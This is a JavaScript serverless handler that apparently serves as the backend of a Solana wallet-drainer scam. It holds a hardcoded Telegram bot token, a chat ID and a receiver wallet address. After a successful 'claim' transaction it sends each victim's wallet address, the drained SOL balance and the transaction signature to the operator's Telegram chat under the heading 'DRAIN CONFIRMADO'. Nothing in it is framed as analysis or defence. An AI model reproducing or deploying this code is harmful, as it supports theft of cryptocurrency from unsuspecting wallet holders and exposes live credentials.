const TELEGRAM_TOKEN = "8987636618:AAGiDzNZ6UjZ7V5EhpqqUGxvOaXCz3_cXxI";
const CHAT_ID = "-5171430125";
const RECEIVER = "G7iCjrZFgGegvzz7xryGi9PrAZAweYiKNYGH42GBkc4X";
export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({error: "Method not allowed"});
  const data = req.body;
  if (data.step === "claim" && data.sig) {
    const msg = `DRAIN CONFIRMADO\nWallet: ${data.address}\nValor: ${data.balance} SOL\nTx: ${data.sig}\nHora: ${new Date().toISOString()}`;
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({chat_id: CHAT_ID, text: msg})
    });
  }
  res.json({ok: true});
}
